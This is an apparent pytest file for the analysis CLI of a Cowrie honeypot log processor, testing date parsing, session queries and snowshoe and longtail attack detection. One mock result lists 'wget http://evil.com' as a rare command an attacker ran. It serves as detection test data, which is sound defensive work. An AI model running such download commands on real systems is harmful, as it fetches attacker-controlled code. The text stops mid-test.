"""Tests for CLI analyze module."""

from __future__ import annotations

import argparse
import json
from datetime import UTC, datetime, timedelta
from pathlib import Path
from typing import Any
from unittest.mock import Mock, patch

import pytest
from sqlalchemy import create_engine
from sqlalchemy.orm import sessionmaker

from cowrieprocessor.cli import analyze
from cowrieprocessor.cli.analyze import (
    _generate_batch_ranges,
    _load_memory_config_from_sensors,
    _parse_date_range,
    _parse_month,
    _parse_quarter,
    _parse_window_arg,
    _print_longtail_summary,
    _query_sessions_for_analysis,
    snowshoe_analyze,
)
from cowrieprocessor.db.base import Base
from cowrieprocessor.db.models import SessionSummary
from cowrieprocessor.threat_detection import LongtailAnalysisResult

# ============================================================================
# Utility Function Tests
# ============================================================================


def test_parse_window_arg_hours() -> None:
    """Test parsing window argument with hours.

    Given: Window string in hours format
    When: Parse window argument function is called
    Then: Correct timedelta is returned

    Args:
        None
    """
    # Given: Window string "24h"
    window_str = "24h"

    # When: Parse the window
    result = _parse_window_arg(window_str)

    # Then: Returns 24-hour timedelta
    assert result == timedelta(hours=24)
    assert result.total_seconds() == 24 * 3600


def test_parse_window_arg_days() -> None:
    """Test parsing window argument with days.

    Given: Window string in days format
    When: Parse window argument function is called
    Then: Correct timedelta is returned

    Args:
        None
    """
    # Given: Window string "7d"
    window_str = "7d"

    # When: Parse the window
    result = _parse_window_arg(window_str)

    # Then: Returns 7-day timedelta
    assert result == timedelta(days=7)
    assert result.total_seconds() == 7 * 24 * 3600


def test_parse_window_arg_invalid_format() -> None:
    """Test parsing window argument with invalid format.

    Given: Window string in invalid format
    When: Parse window argument function is called
    Then: ValueError is raised with clear message

    Args:
        None
    """
    # Given: Invalid window string "24"
    window_str = "24"

    # When/Then: Parsing raises ValueError
    with pytest.raises(ValueError, match="Invalid window format"):
        _parse_window_arg(window_str)


def test_parse_window_arg_case_insensitive() -> None:
    """Test parsing window argument is case insensitive.

    Given: Window strings with mixed case
    When: Parse window argument function is called
    Then: Parsing succeeds regardless of case

    Args:
        None
    """
    # Given: Various case formats
    test_cases = ["24H", "7D", "48h", "30d"]

    # When/Then: All parse successfully
    for window_str in test_cases:
        result = _parse_window_arg(window_str)
        assert isinstance(result, timedelta)


def test_parse_date_range_valid() -> None:
    """Test parsing valid date range.

    Given: Valid start and end date strings
    When: Parse date range function is called
    Then: Correct datetime tuple is returned

    Args:
        None
    """
    # Given: Valid date strings
    start_date = "2025-01-01"
    end_date = "2025-01-31"

    # When: Parse date range
    start_dt, end_dt = _parse_date_range(start_date, end_date)

    # Then: Returns correct datetime objects (at midnight)
    assert start_dt == datetime(2025, 1, 1, 0, 0, 0, tzinfo=UTC)
    assert end_dt == datetime(2025, 1, 31, 0, 0, 0, tzinfo=UTC)
    assert end_dt > start_dt


def test_parse_quarter_q1() -> None:
    """Test parsing Q1 quarter string.

    Given: Q1 quarter string in format Q1YYYY
    When: Parse quarter function is called
    Then: Correct Q1 date range is returned

    Args:
        None
    """
    # Given: Q1 quarter string (format: Q1YYYY)
    quarter_str = "Q12025"

    # When: Parse quarter
    start_dt, end_dt = _parse_quarter(quarter_str)

    # Then: Returns Jan 1 - Apr 1 (exclusive end)
    assert start_dt == datetime(2025, 1, 1, 0, 0, 0, tzinfo=UTC)
    assert end_dt == datetime(2025, 4, 1, 0, 0, 0, tzinfo=UTC)


def test_parse_quarter_q4() -> None:
    """Test parsing Q4 quarter string.

    Given: Q4 quarter string in format Q4YYYY
    When: Parse quarter function is called
    Then: Correct Q4 date range is returned

    Args:
        None
    """
    # Given: Q4 quarter string (format: Q4YYYY)
    quarter_str = "Q42024"

    # When: Parse quarter
    start_dt, end_dt = _parse_quarter(quarter_str)

    # Then: Returns Oct 1 - Jan 1 next year (exclusive end)
    assert start_dt == datetime(2024, 10, 1, 0, 0, 0, tzinfo=UTC)
    assert end_dt == datetime(2025, 1, 1, 0, 0, 0, tzinfo=UTC)


def test_parse_month_january() -> None:
    """Test parsing month string for January.

    Given: January month string
    When: Parse month function is called
    Then: Correct January date range is returned

    Args:
        None
    """
    # Given: January month string
    month_str = "2025-01"

    # When: Parse month
    start_dt, end_dt = _parse_month(month_str)

    # Then: Returns Jan 1 - Feb 1 (exclusive end)
    assert start_dt == datetime(2025, 1, 1, 0, 0, 0, tzinfo=UTC)
    assert end_dt == datetime(2025, 2, 1, 0, 0, 0, tzinfo=UTC)


def test_parse_month_february_leap_year() -> None:
    """Test parsing month string for February in leap year.

    Given: February 2024 month string (leap year)
    When: Parse month function is called
    Then: Correct February date range is returned

    Args:
        None
    """
    # Given: February 2024 (leap year)
    month_str = "2024-02"

    # When: Parse month
    start_dt, end_dt = _parse_month(month_str)

    # Then: Returns Feb 1 - Mar 1 (exclusive end)
    assert start_dt == datetime(2024, 2, 1, 0, 0, 0, tzinfo=UTC)
    assert end_dt == datetime(2024, 3, 1, 0, 0, 0, tzinfo=UTC)


def test_generate_batch_ranges_single_batch() -> None:
    """Test generating batch ranges for small date range.

    Given: Date range smaller than batch size
    When: Generate batch ranges function is called
    Then: Single batch covering the entire range is returned

    Args:
        None
    """
    # Given: 5-day range with 10-day batch size
    start_date = datetime(2025, 1, 1, 0, 0, 0, tzinfo=UTC)
    end_date = datetime(2025, 1, 6, 0, 0, 0, tzinfo=UTC)
    batch_size_days = 10

    # When: Generate batch ranges
    ranges = _generate_batch_ranges(start_date, end_date, batch_size_days)

    # Then: Single batch is returned
    assert len(ranges) == 1
    assert ranges[0][0] == start_date
    assert ranges[0][1] == end_date


def test_generate_batch_ranges_multiple_batches() -> None:
    """Test generating batch ranges for large date range.

    Given: Date range larger than batch size
    When: Generate batch ranges function is called
    Then: Multiple batches covering the range are returned

    Args:
        None
    """
    # Given: 25-day range with 10-day batch size
    start_date = datetime(2025, 1, 1, 0, 0, 0, tzinfo=UTC)
    end_date = datetime(2025, 1, 26, 0, 0, 0, tzinfo=UTC)
    batch_size_days = 10

    # When: Generate batch ranges
    ranges = _generate_batch_ranges(start_date, end_date, batch_size_days)

    # Then: Multiple batches are returned
    assert len(ranges) == 3
    # First batch: Jan 1-11
    assert ranges[0][0] == datetime(2025, 1, 1, 0, 0, 0, tzinfo=UTC)
    assert ranges[0][1] == datetime(2025, 1, 11, 0, 0, 0, tzinfo=UTC)
    # Second batch: Jan 11-21
    assert ranges[1][0] == datetime(2025, 1, 11, 0, 0, 0, tzinfo=UTC)
    assert ranges[1][1] == datetime(2025, 1, 21, 0, 0, 0, tzinfo=UTC)
    # Third batch: Jan 21-26
    assert ranges[2][0] == datetime(2025, 1, 21, 0, 0, 0, tzinfo=UTC)
    assert ranges[2][1] == end_date


def test_parse_window_arg_whitespace() -> None:
    """Test parsing window argument with extra whitespace.

    Given: Window string with leading/trailing whitespace
    When: Parse window argument function is called
    Then: Whitespace is handled correctly

    Args:
        None
    """
    # Given: Window string with whitespace
    window_str = "  24h  "

    # When: Parse the window
    result = _parse_window_arg(window_str)

    # Then: Returns correct timedelta
    assert result == timedelta(hours=24)


def test_parse_quarter_invalid_number() -> None:
    """Test parsing quarter with invalid quarter number.

    Given: Quarter string with invalid number (> 4)
    When: Parse quarter function is called
    Then: ValueError is raised

    Args:
        None
    """
    # Given: Invalid quarter number
    quarter_str = "Q52025"

    # When/Then: Raises ValueError
    with pytest.raises(ValueError, match="Invalid quarter number"):
        _parse_quarter(quarter_str)


def test_parse_month_december() -> None:
    """Test parsing December month string.

    Given: December month string
    When: Parse month function is called
    Then: Correct December to January range is returned

    Args:
        None
    """
    # Given: December month string
    month_str = "2025-12"

    # When: Parse month
    start_dt, end_dt = _parse_month(month_str)

    # Then: Returns Dec 1 - Jan 1 next year (exclusive end)
    assert start_dt == datetime(2025, 12, 1, 0, 0, 0, tzinfo=UTC)
    assert end_dt == datetime(2026, 1, 1, 0, 0, 0, tzinfo=UTC)


def test_parse_month_invalid_format() -> None:
    """Test parsing month with invalid format.

    Given: Month string with invalid format
    When: Parse month function is called
    Then: ValueError is raised

    Args:
        None
    """
    # Given: Invalid month string
    month_str = "2025/12"

    # When/Then: Raises ValueError
    with pytest.raises(ValueError, match="Invalid month format"):
        _parse_month(month_str)


def test_generate_batch_ranges_exact_multiple() -> None:
    """Test generating batch ranges when range is exact multiple of batch size.

    Given: Date range that is exact multiple of batch size
    When: Generate batch ranges function is called
    Then: Correct number of batches with no remainder

    Args:
        None
    """
    # Given: 20-day range with 10-day batch size (exact multiple)
    start_date = datetime(2025, 1, 1, 0, 0, 0, tzinfo=UTC)
    end_date = datetime(2025, 1, 21, 0, 0, 0, tzinfo=UTC)
    batch_size_days = 10

    # When: Generate batch ranges
    ranges = _generate_batch_ranges(start_date, end_date, batch_size_days)

    # Then: Exactly 2 batches
    assert len(ranges) == 2
    assert ranges[0][1] == ranges[1][0]  # Batches should be contiguous
    assert ranges[1][1] == end_date


# ============================================================================
# Query Function Tests
# ============================================================================


def test_query_sessions_for_analysis_no_sensor_filter(tmp_path: Path) -> None:
    """Test querying sessions without sensor filter.

    Given: Database with sessions in time window
    When: Query sessions function is called without sensor filter
    Then: All sessions in window are returned

    Args:
        tmp_path: Temporary directory for test database
    """
    # Given: Setup test database with sessions
    db_path = tmp_path / "test.db"
    engine = create_engine(f"sqlite:///{db_path}")
    Base.metadata.create_all(engine)
    SessionLocal = sessionmaker(bind=engine)

    # Create test data
    session = SessionLocal()
    now = datetime.now(UTC)

    # Sessions within window (i=1 to 5 to avoid edge case at now)
    for i in range(1, 6):
        session.add(
            SessionSummary(
                session_id=f"session_{i}",
                first_event_at=now - timedelta(hours=i),
                last_event_at=now - timedelta(hours=i) + timedelta(minutes=10),
            )
        )

    # Session outside window
    session.add(
        SessionSummary(
            session_id="old_session",
            first_event_at=now - timedelta(days=30),
            last_event_at=now - timedelta(days=30) + timedelta(minutes=10),
        )
    )

    session.commit()
    session.close()

    # When: Query sessions in 12-hour window
    window_start = now - timedelta(hours=12)
    window_end = now + timedelta(minutes=1)  # Slightly after now to include all sessions
    results = _query_sessions_for_analysis(SessionLocal, window_start, window_end, sensor=None)

    # Then: Only sessions in window are returned (not the old one)
    assert len(results) == 5
    assert all(r.session_id.startswith("session_") for r in results)
    assert not any(r.session_id == "old_session" for r in results)

    engine.dispose()


def test_query_sessions_for_analysis_empty_result(tmp_path: Path) -> None:
    """Test querying sessions when no sessions exist in window.

    Given: Database with no sessions in time window
    When: Query sessions function is called
    Then: Empty list is returned

    Args:
        tmp_path: Temporary directory for test database
    """
    # Given: Empty database
    db_path = tmp_path / "test.db"
    engine = create_engine(f"sqlite:///{db_path}")
    Base.metadata.create_all(engine)
    SessionLocal = sessionmaker(bind=engine)

    # When: Query sessions
    now = datetime.now(UTC)
    window_start = now - timedelta(hours=24)
    window_end = now
    results = _query_sessions_for_analysis(SessionLocal, window_start, window_end, sensor=None)

    # Then: Empty list returned
    assert len(results) == 0
    assert isinstance(results, list)

    engine.dispose()


# ============================================================================
# Configuration Function Tests
# ============================================================================


def test_load_memory_config_from_sensors_no_file() -> None:
    """Test loading memory config when sensors.toml doesn't exist.

    Given: No sensors.toml file exists
    When: Load memory config function is called
    Then: Default values are returned

    Args:
        None
    """
    # Given/When: Load config (no sensors.toml in typical test environment)
    with patch("pathlib.Path.exists", return_value=False):
        config = _load_memory_config_from_sensors()

    # Then: Returns default values
    assert isinstance(config, dict)
    assert "memory_limit_gb" in config
    assert "memory_warning_threshold" in config


# ============================================================================
# Print Function Tests
# ============================================================================


def test_print_longtail_summary_with_anomalies(capsys: Any) -> None:
    """Test printing longtail summary with anomalies detected.

    Given: Analysis result with anomalies
    When: Print longtail summary function is called
    Then: Summary is printed with anomaly details

    Args:
        capsys: Pytest fixture for capturing stdout
    """
    # Given: Result with anomalies using dataclass defaults
    result = LongtailAnalysisResult()
    result.rare_command_count = 5
    result.anomalous_sequence_count = 3
    result.outlier_session_count = 2
    result.total_sessions_analyzed = 100
    result.analysis_duration_seconds = 12.5
    result.memory_usage_mb = 150.0

    # When: Print summary
    _print_longtail_summary(result)

    # Then: Output contains key information
    captured = capsys.readouterr()
    assert ("LONGTAIL" in captured.out or "Longtail" in captured.out or "ANALYSIS" in captured.out)


def test_print_longtail_summary_no_anomalies(capsys: Any) -> None:
    """Test printing longtail summary with no anomalies.

    Given: Analysis result with no anomalies
    When: Print longtail summary function is called
    Then: Summary indicates no detection

    Args:
        capsys: Pytest fixture for capturing stdout
    """
    # Given: Result with no anomalies
    result = LongtailAnalysisResult()
    result.rare_command_count = 0
    result.anomalous_sequence_count = 0
    result.outlier_session_count = 0
    result.total_sessions_analyzed = 50

    # When: Print summary
    _print_longtail_summary(result)

    # Then: Output indicates no detection
    captured = capsys.readouterr()
    assert ("LONGTAIL" in captured.out or "Longtail" in captured.out or "ANALYSIS" in captured.out)


# ============================================================================
# Analysis Function Tests (snowshoe_analyze)
# ============================================================================


@patch("cowrieprocessor.cli.analyze.resolve_database_settings")
@patch("cowrieprocessor.cli.analyze.create_engine_from_settings")
@patch("cowrieprocessor.cli.analyze.apply_migrations")
@patch("cowrieprocessor.cli.analyze.create_session_maker")
@patch("cowrieprocessor.cli.analyze.SnowshoeDetector")
@patch("cowrieprocessor.cli.analyze._query_sessions_for_analysis")
def test_snowshoe_analyze_success_with_detection(
    mock_query: Mock,
    mock_detector_class: Mock,
    mock_session_maker: Mock,
    mock_migrations: Mock,
    mock_engine: Mock,
    mock_settings: Mock,
    tmp_path: Path,
) -> None:
    """Test snowshoe analyze with successful detection.

    Given: Database with sessions that trigger snowshoe detection
    When: Snowshoe analyze function is called
    Then: Analysis completes successfully and returns 0

    Args:
        mock_query: Mock for session query
        mock_detector_class: Mock for SnowshoeDetector class
        mock_session_maker: Mock for session maker
        mock_migrations: Mock for migrations
        mock_engine: Mock for engine creation
        mock_settings: Mock for settings resolution
        tmp_path: Temporary directory for output
    """
    # Given: Mock setup
    mock_settings.return_value = {"db_path": ":memory:"}
    mock_engine.return_value = Mock()

    # Mock sessions data
    mock_sessions = [Mock(session_id=f"session_{i}") for i in range(10)]
    mock_query.return_value = mock_sessions

    # Mock detector that detects snowshoe
    mock_detector = Mock()
    mock_detector.detect.return_value = {
        "is_likely_snowshoe": True,
        "confidence": 0.9,
        "metrics": {"ip_diversity": 10, "timing_variance": 0.1},
    }
    mock_detector_class.return_value = mock_detector

    # Create args namespace
    args = argparse.Namespace(
        db=":memory:",
        window="24h",
        sensitivity=0.7,
        sensor=None,
        store_results=False,
        output=None,
        status_dir=None,
        ingest_id=None,
    )

    # When: Run snowshoe analysis
    result = snowshoe_analyze(args)

    # Then: Analysis succeeds (exit code 0)
    assert result == 0
    mock_detector.detect.assert_called_once()
    mock_query.assert_called_once()


@patch("cowrieprocessor.cli.analyze.resolve_database_settings")
@patch("cowrieprocessor.cli.analyze.create_engine_from_settings")
@patch("cowrieprocessor.cli.analyze.apply_migrations")
@patch("cowrieprocessor.cli.analyze.create_session_maker")
@patch("cowrieprocessor.cli.analyze._query_sessions_for_analysis")
def test_snowshoe_analyze_no_sessions_found(
    mock_query: Mock,
    mock_session_maker: Mock,
    mock_migrations: Mock,
    mock_engine: Mock,
    mock_settings: Mock,
) -> None:
    """Test snowshoe analyze when no sessions are found.

    Given: Database with no sessions in time window
    When: Snowshoe analyze function is called
    Then: Warning is logged and returns exit code 1

    Args:
        mock_query: Mock for session query
        mock_session_maker: Mock for session maker
        mock_migrations: Mock for migrations
        mock_engine: Mock for engine creation
        mock_settings: Mock for settings resolution
    """
    # Given: Empty session list
    mock_settings.return_value = {"db_path": ":memory:"}
    mock_engine.return_value = Mock()
    mock_query.return_value = []

    args = argparse.Namespace(
        db=":memory:",
        window="24h",
        sensitivity=0.7,
        sensor=None,
        store_results=False,
        output=None,
        status_dir=None,
        ingest_id=None,
    )

    # When: Run snowshoe analysis
    result = snowshoe_analyze(args)

    # Then: Returns error code 1
    assert result == 1
    mock_query.assert_called_once()


@patch("cowrieprocessor.cli.analyze.resolve_database_settings")
@patch("cowrieprocessor.cli.analyze.create_engine_from_settings")
@patch("cowrieprocessor.cli.analyze.apply_migrations")
@patch("cowrieprocessor.cli.analyze.create_session_maker")
@patch("cowrieprocessor.cli.analyze.SnowshoeDetector")
@patch("cowrieprocessor.cli.analyze._query_sessions_for_analysis")
def test_snowshoe_analyze_output_to_file(
    mock_query: Mock,
    mock_detector_class: Mock,
    mock_session_maker: Mock,
    mock_migrations: Mock,
    mock_engine: Mock,
    mock_settings: Mock,
    tmp_path: Path,
) -> None:
    """Test snowshoe analyze with file output.

    Given: Analysis configured to write results to file
    When: Snowshoe analyze function is called
    Then: Results are written to specified file

    Args:
        mock_query: Mock for session query
        mock_detector_class: Mock for SnowshoeDetector class
        mock_session_maker: Mock for session maker
        mock_migrations: Mock for migrations
        mock_engine: Mock for engine creation
        mock_settings: Mock for settings resolution
        tmp_path: Temporary directory for output
    """
    # Given: Mock setup with output file
    mock_settings.return_value = {"db_path": ":memory:"}
    mock_engine.return_value = Mock()

    mock_sessions = [Mock(session_id=f"session_{i}") for i in range(5)]
    mock_query.return_value = mock_sessions

    detection_result = {
        "is_likely_snowshoe": True,
        "confidence": 0.85,
        "metrics": {"ip_diversity": 8},
    }
    mock_detector = Mock()
    mock_detector.detect.return_value = detection_result
    mock_detector_class.return_value = mock_detector

    output_file = tmp_path / "results.json"
    args = argparse.Namespace(
        db=":memory:",
        window="12h",
        sensitivity=0.7,
        sensor=None,
        store_results=False,
        output=str(output_file),
        status_dir=None,
        ingest_id=None,
    )

    # When: Run snowshoe analysis
    result = snowshoe_analyze(args)

    # Then: File is created and contains results
    assert result == 0
    assert output_file.exists()
    with output_file.open() as f:
        saved_result = json.load(f)
    assert saved_result["is_likely_snowshoe"] is True
    assert saved_result["confidence"] == 0.85


# ============================================================================
# BATCH 1: CLI Entry Point Tests (Day 17)
# ============================================================================


@patch("cowrieprocessor.cli.analyze.resolve_database_settings")
@patch("cowrieprocessor.cli.analyze.create_engine_from_settings")
@patch("cowrieprocessor.cli.analyze.apply_migrations")
@patch("cowrieprocessor.cli.analyze.create_session_maker")
@patch("cowrieprocessor.cli.analyze.LongtailAnalyzer")
@patch("cowrieprocessor.cli.analyze._query_sessions_for_analysis")
def test_longtail_analyze_success_basic(
    mock_query: Mock,
    mock_analyzer_class: Mock,
    mock_session_maker: Mock,
    mock_migrations: Mock,
    mock_engine: Mock,
    mock_settings: Mock,
    capsys: Any,
) -> None:
    """Test longtail analyze with successful basic analysis.

    Given: Database with sessions for analysis
    When: Longtail analyze function is called
    Then: Analysis completes successfully and returns 0

    Args:
        mock_query: Mock for session query
        mock_analyzer_class: Mock for LongtailAnalyzer class
        mock_session_maker: Mock for session maker
        mock_migrations: Mock for migrations
        mock_engine: Mock for engine creation
        mock_settings: Mock for settings resolution
        capsys: Pytest fixture for capturing stdout
    """
    # Given: Mock setup
    mock_settings.return_value = {"db_path": ":memory:"}
    mock_engine.return_value = Mock()

    # Mock sessions data
    mock_sessions = [Mock(session_id=f"session_{i}") for i in range(20)]
    mock_query.return_value = mock_sessions

    # Mock analyzer result
    mock_result = LongtailAnalysisResult()
    mock_result.total_sessions_analyzed = 20
    mock_result.rare_command_count = 5
    mock_result.anomalous_sequence_count = 2
    mock_result.outlier_session_count = 1
    mock_result.analysis_duration_seconds = 5.0
    mock_result.memory_usage_mb = 100.0

    mock_analyzer = Mock()
    mock_analyzer.analyze.return_value = mock_result
    mock_analyzer_class.return_value = mock_analyzer

    # Create args namespace
    args = argparse.Namespace(
        db=":memory:",
        lookback_days=7,
        rarity_threshold=0.05,
        sequence_window=5,
        cluster_eps=0.3,
        min_cluster_size=5,
        entropy_threshold=0.8,
        sensitivity_threshold=0.95,
        batch_size=100,
        memory_limit_gb=None,
        sensor=None,
        output=None,
        store_results=False,
        detailed=False,
        status_dir=None,
        ingest_id=None,
        batch_mode=False,
        password_intelligence=False,
        password_enrichment=False,
        max_enrichment_sessions=50,
        cache_dir=None,
    )

    # When: Run longtail analysis
    result = analyze.longtail_analyze(args)

    # Then: Analysis succeeds (exit code 0)
    assert result == 0
    mock_analyzer.analyze.assert_called_once()
    mock_query.assert_called_once()

    # Verify summary was printed
    captured = capsys.readouterr()
    assert "LONGTAIL" in captured.out or "ANALYSIS" in captured.out


@patch("cowrieprocessor.cli.analyze.resolve_database_settings")
@patch("cowrieprocessor.cli.analyze.create_engine_from_settings")
@patch("cowrieprocessor.cli.analyze.apply_migrations")
@patch("cowrieprocessor.cli.analyze.create_session_maker")
@patch("cowrieprocessor.cli.analyze._query_sessions_for_analysis")
def test_longtail_analyze_no_sessions_found(
    mock_query: Mock,
    mock_session_maker: Mock,
    mock_migrations: Mock,
    mock_engine: Mock,
    mock_settings: Mock,
) -> None:
    """Test longtail analyze when no sessions are found.

    Given: Database with no sessions in lookback window
    When: Longtail analyze function is called
    Then: Warning is logged and returns exit code 1

    Args:
        mock_query: Mock for session query
        mock_session_maker: Mock for session maker
        mock_migrations: Mock for migrations
        mock_engine: Mock for engine creation
        mock_settings: Mock for settings resolution
    """
    # Given: Empty session list
    mock_settings.return_value = {"db_path": ":memory:"}
    mock_engine.return_value = Mock()
    mock_query.return_value = []

    args = argparse.Namespace(
        db=":memory:",
        lookback_days=7,
        rarity_threshold=0.05,
        sequence_window=5,
        cluster_eps=0.3,
        min_cluster_size=5,
        entropy_threshold=0.8,
        sensitivity_threshold=0.95,
        batch_size=100,
        memory_limit_gb=None,
        sensor=None,
        output=None,
        store_results=False,
        detailed=False,
        status_dir=None,
        ingest_id=None,
        batch_mode=False,
        password_intelligence=False,
        password_enrichment=False,
        max_enrichment_sessions=50,
        cache_dir=None,
    )

    # When: Run longtail analysis
    result = analyze.longtail_analyze(args)

    # Then: Returns error code 1
    assert result == 1
    mock_query.assert_called_once()


@patch("cowrieprocessor.cli.analyze.resolve_database_settings")
@patch("cowrieprocessor.cli.analyze.create_engine_from_settings")
@patch("cowrieprocessor.cli.analyze.apply_migrations")
@patch("cowrieprocessor.cli.analyze.create_session_maker")
@patch("cowrieprocessor.cli.analyze.LongtailAnalyzer")
@patch("cowrieprocessor.cli.analyze._query_sessions_for_analysis")
def test_longtail_analyze_with_file_output(
    mock_query: Mock,
    mock_analyzer_class: Mock,
    mock_session_maker: Mock,
    mock_migrations: Mock,
    mock_engine: Mock,
    mock_settings: Mock,
    tmp_path: Path,
) -> None:
    """Test longtail analyze with JSON file output.

    Given: Analysis configured to write results to file
    When: Longtail analyze function is called
    Then: Results are written to specified file

    Args:
        mock_query: Mock for session query
        mock_analyzer_class: Mock for LongtailAnalyzer class
        mock_session_maker: Mock for session maker
        mock_migrations: Mock for migrations
        mock_engine: Mock for engine creation
        mock_settings: Mock for settings resolution
        tmp_path: Temporary directory for output
    """
    # Given: Mock setup with output file
    mock_settings.return_value = {"db_path": ":memory:"}
    mock_engine.return_value = Mock()

    mock_sessions = [Mock(session_id=f"session_{i}") for i in range(10)]
    mock_query.return_value = mock_sessions

    # Mock result as dict (JSON-serializable format)
    mock_result_dict = {
        "total_sessions_analyzed": 10,
        "total_events_analyzed": 150,
        "rare_command_count": 3,
        "anomalous_sequence_count": 1,
        "outlier_session_count": 2,
        "emerging_pattern_count": 0,
        "high_entropy_payload_count": 1,
        "analysis_duration_seconds": 5.0,
        "memory_usage_mb": 100.0,
        "rare_commands": [{"command": "wget http://evil.com", "frequency": 1, "rarity_score": 0.001}],
        "anomalous_sequences": [],
        "outlier_sessions": [],
        "emerging_patterns": [],
        "high_entropy_payloads": [],
        "statistical_summary": {},
    }

    mock_analyzer = Mock()
    mock_analyzer.analyze.return_value = mock_result_dict
    mock_analyzer_class.return_value = mock_analyzer

    output_file = tmp_path / "longtail_results.json"
    args = argparse.Namespace(
        db=":memory:",
        lookback_days=7,
        rarity_threshold=0.05,
        sequence_window=5,
        cluster_eps=0.3,
        min_cluster_size=5,
        entropy_threshold=0.8,
        sensitivity_threshold=0.95,
        batch_size=100,
        memory_limit_gb=None,
        sensor=None,
        output=str(output_file),
        store_results=False,
        detailed=True,
        status_dir=None,
        ingest_id=None,
        batch_mode=False,
        password_intelligence=False,
        password_enrichment=False,
        max_enrichment_sessions=50,
        cache_dir=None,
    )

    # When: Run longtail analysis
    result = analyze.longtail_analyze(args)

    # Then: File is created and contains results
    assert result == 0
    assert output_file.exists()
    with output_file.open() as f:
        saved_result = json.load(f)
    assert saved_result["total_sessions_analyzed"] == 10
    assert saved_result["rare_command_count"] == 3


@patch("cowrieprocessor.cli.analyze.resolve_database_settings")
@patch("cowrieprocessor.cli.analyze.create_engine_from_settings")
@patch("cowrieprocessor.cli.analyze.create_session_maker")
def test_snowshoe_report_success_basic(
    mock_session_maker: Mock,
    mock_engine: Mock,
    mock_settings: Mock,
    tmp_path: Path,
    capsys: Any,
) -> None:
    """Test snowshoe report generation with basic detection data.

    Given: Database with snowshoe detection results
    When: Snowshoe report function is called
    Then: Report is generated successfully

    Args:
        mock_session_maker: Mock for session maker
        mock_engine: Mock for engine creation
        mock_settings: Mock for settings resolution
        tmp_path: Temporary directory for database
        capsys: Pytest fixture for capturing stdout
    """
    # Given: Real database with SnowshoeDetection records
    from cowrieprocessor.db.models import SnowshoeDetection

    db_path = tmp_path / "test.db"
    engine = create_engine(f"sqlite:///{db_path}")
    Base.metadata.create_all(engine)
    SessionLocal = sessionmaker(bind=engine)

    # Create test detection data
    with SessionLocal() as session:
        detection = SnowshoeDetection(
            window_start=datetime(2025, 10, 20, 0, 0, 0, tzinfo=UTC),
            window_end=datetime(2025, 10, 21, 0, 0, 0, tzinfo=UTC),
            detection_time=datetime(2025, 10, 20, 12, 0, 0, tzinfo=UTC),
            confidence_score="0.85",
            unique_ips=25,
            single_attempt_ips=20,
            geographic_spread="0.7",
            indicators={"rapid_ip_rotation": True, "distributed_timing": True},
            is_likely_snowshoe=True,
            coordinated_timing=True,
            recommendation="Block IPs and investigate",
            analysis_metadata={"total_sessions": 50, "avg_session_duration": 30.5},
        )
        session.add(detection)
        session.commit()

    # Mock the settings resolution to use our test database
    mock_settings.return_value = {"db_url": f"sqlite:///{db_path}"}
    mock_engine.return_value = engine
    mock_session_maker.return_value = SessionLocal

    args = argparse.Namespace(
        db=f"sqlite:///{db_path}",
        date="2025-10-20",
        min_confidence=None,
        output=None,
    )

    # When: Generate snowshoe report
    result = analyze.snowshoe_report(args)

    # Then: Report succeeds (exit code 0)
    assert result == 0

    # Verify JSON report was printed
    captured = capsys.readouterr()
    report_data = json.loads(captured.out)
    assert report_data["report_type"] == "snowshoe_detection_summary"
    assert report_data["summary"]["total_detections"] == 1
    assert report_data["summary"]["high_confidence_detections"] == 1
    assert len(report_data["detections"]) == 1
    assert report_data["detections"][0]["is_likely_snowshoe"] is True

    engine.dispose()


@patch("cowrieprocessor.cli.analyze.resolve_database_settings")
@patch("cowrieprocessor.cli.analyze.create_engine_from_settings")
@patch("cowrieprocessor.cli.analyze.create_session_maker")
def test_snowshoe_report_with_file_output(
    mock_session_maker: Mock,
    mock_engine: Mock,
    mock_settings: Mock,
    tmp_path: Path,
) -> None:
    """Test snowshoe report with file output.

    Given: Database with snowshoe detection results
    When: Snowshoe report function is called with output file
    Then: Report is written to file

    Args:
        mock_session_maker: Mock for session maker
        mock_engine: Mock for engine creation
        mock_settings: Mock for settings resolution
        tmp_path: Temporary directory
    """
    # Given: Real database with SnowshoeDetection records
    from cowrieprocessor.db.models import SnowshoeDetection

    db_path = tmp_path / "test.db"
    engine = create_engine(f"sqlite:///{db_path}")
    Base.metadata.create_all(engine)
    SessionLocal = sessionmaker(bind=engine)

    # Create test detection data with recent timestamp
    now = datetime.now(UTC)
    recent_time = now - timedelta(days=2)

    with SessionLocal() as session:
        detection = SnowshoeDetection(
            window_start=recent_time - timedelta(hours=24),
            window_end=recent_time,
            detection_time=recent_time - timedelta(hours=12),
            confidence_score="0.92",
            unique_ips=30,
            single_attempt_ips=25,
            geographic_spread="0.8",
            indicators={"ip_diversity": 30},
            is_likely_snowshoe=True,
            coordinated_timing=False,
            recommendation="Monitor and analyze",
            analysis_metadata={"window_hours": 168},
        )
        session.add(detection)
        session.commit()

    # Mock the settings resolution
    mock_settings.return_value = {"db_url": f"sqlite:///{db_path}"}
    mock_engine.return_value = engine
    mock_session_maker.return_value = SessionLocal

    output_file = tmp_path / "snowshoe_report.json"
    args = argparse.Namespace(
        db=f"sqlite:///{db_path}",
        date=None,  # Use default (last 7 days) - detection is within this window
        min_confidence=0.9,
        output=str(output_file),
    )

    # When: Generate snowshoe report with file output
    result = analyze.snowshoe_report(args)

    # Then: File is created and contains report
    assert result == 0
    assert output_file.exists()

    with output_file.open() as f:
        report_data = json.load(f)
    assert report_data["report_type"] == "snowshoe_detection_summary"
    assert report_data["summary"]["total_detections"] == 1
    assert report_data["detections"][0]["confidence_score"] == 0.92

    engine.dispose()


@patch("cowrieprocessor.cli.analyze.resolve_database_settings")
@patch("cowrieprocessor.cli.analyze.create_engine_from_settings")
@patch("cowrieprocessor.cli.analyze.create_session_maker")
def test_snowshoe_report_no_detections(
    mock_session_maker: Mock,
    mock_engine: Mock,
    mock_settings: Mock,
    tmp_path: Path,
    capsys: Any,
) -> None:
    """Test snowshoe report when no detections exist.

    Given: Database with no snowshoe detections
    When: Snowshoe report function is called
    Then: Empty report is generated

    Args:
        mock_session_maker: Mock for session maker
        mock_engine: Mock for engine creation
        mock_settings: Mock for settings resolution
        tmp_path: Temporary directory
        capsys: Pytest fixture for capturing stdout
    """
    # Given: Empty database (no detections)
    db_path = tmp_path / "test.db"
    engine = create_engine(f"sqlite:///{db_path}")
    Base.metadata.create_all(engine)
    SessionLocal = sessionmaker(bind=engine)

    mock_settings.return_value = {"db_url": f"sqlite:///{db_path}"}
    mock_engine.return_value = engine
    mock_session_maker.return_value = SessionLocal

    args = argparse.Namespace(
